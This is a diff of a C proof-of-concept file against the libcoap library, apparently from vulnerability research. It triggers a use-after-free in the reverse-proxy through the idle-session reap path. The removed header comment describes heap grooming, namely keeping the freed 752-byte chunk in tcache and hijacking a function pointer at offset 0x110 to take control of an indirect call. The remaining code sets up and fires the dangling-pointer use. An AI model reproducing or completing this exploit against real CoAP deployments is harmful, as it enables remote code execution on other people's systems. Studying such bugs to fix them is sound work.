@@ -1,27 +1,4 @@
-/*
- * Bug B exploitation prep — trigger the proxy UAF via the IDLE-REAP free path
- * (coap_io.c:1402-1409) instead of max-idle eviction (coap_session.c:1123).
- *
- * Why: the eviction path frees the incoming session and IMMEDIATELY allocates a
- * replacement session (coap_session.c:1213, same 752B size class), so under real
- * glibc the freed slot is instantly reclaimed by a valid session -> the dangling
- * pointer aliases a live session (type confusion), NOT attacker bytes. The idle
- * reap frees the session during the io tick with NO replacement allocation, so
- * the 752B chunk goes to tcache and STAYS free -> groomable. This is the
- * precondition for landing controlled bytes in the slot (the lfunc[].l_write
- * hijack at offset 0x110 -> control of the indirect call at coap_net.c:1006).
- *
- * The incoming session is internal to the proxy, so for the actual refill we
- * drive it under gdb (which stands in for an attacker same-size allocation
- * winning the freed tcache slot). This file just establishes the groomable
- * trigger and the UAF use.
- *
- * Build (ASan, confirm the UAF fires via the reap path):
- *   make poc-bug-b-groom
- * Build (non-ASan, for the gdb refill demo):
- *   cc -g -O0 -fno-omit-frame-pointer poc-bug-b-groom.c \
- *      -I<libcoap>/include <libcoap>/.libs/libcoap-3-notls.a -o pbg-noasan
- */
+/* Bug B exploitation prep: trigger the proxy UAF via the idle-reap free path (groomable tcache slot). */
 #include <netinet/in.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -117,28 +94,24 @@ main(void) {
   coap_add_resource(origin, ores);
 
   coap_context_t *proxy = make_server(PROXY_PORT);
-  /* Short idle timeout so the incoming session is REAPED (coap_io.c:1409),
-   * not evicted. No max_idle_sessions trick, no 2nd client. */
+  /* Short idle timeout so the incoming session is reaped, not evicted. */
   coap_context_set_session_timeout(proxy, 1);
   coap_add_resource(proxy, coap_resource_reverse_proxy_init(proxy_handler, 0));
   coap_register_response_handler(proxy, proxy_response);
-  /* No coap_register_event_handler() -> proxy cleanup gated off (Bug B). */
+  /* No event handler -> proxy cleanup gated off (Bug B). */
 
   coap_context_t *client = coap_new_context(NULL);
 
-  /* 1. Client S sends one GET; proxy forwards upstream. ORIGIN is withheld
-   *    (not pumped) so the proxy_req entry stays in flight. */
+  /* 1. Client S sends one GET; ORIGIN withheld -> proxy_req stays in flight. */
   coap_session_t *S = make_client(client, PROXY_PORT);
   send_get(S, (const uint8_t *)"\x11\x11\x11\x11", 4);
   { coap_context_t *cp[] = {client, proxy, NULL}; pump(12, cp); }
 
-  /* 2. Let the proxy's incoming server session go idle past session_timeout,
-   *    then pump ONLY the proxy so the io tick reaps it (free, no realloc). */
+  /* 2. Let the session go idle, then pump only the proxy so the io tick reaps it. */
   { struct timespec ts = { 2, 0 }; nanosleep(&ts, NULL); }
   { coap_context_t *cp[] = {proxy, NULL}; pump(4, cp); }
 
-  /* 3. Now release the upstream response. The proxy forwards it through the
-   *    dangling incoming pointer -> use-after-free (slot was groomable). */
+  /* 3. Release the upstream response -> forward through dangling pointer -> UAF. */
   { coap_context_t *all[] = {origin, proxy, client, NULL}; pump(40, all); }
 
   coap_free_context(client);
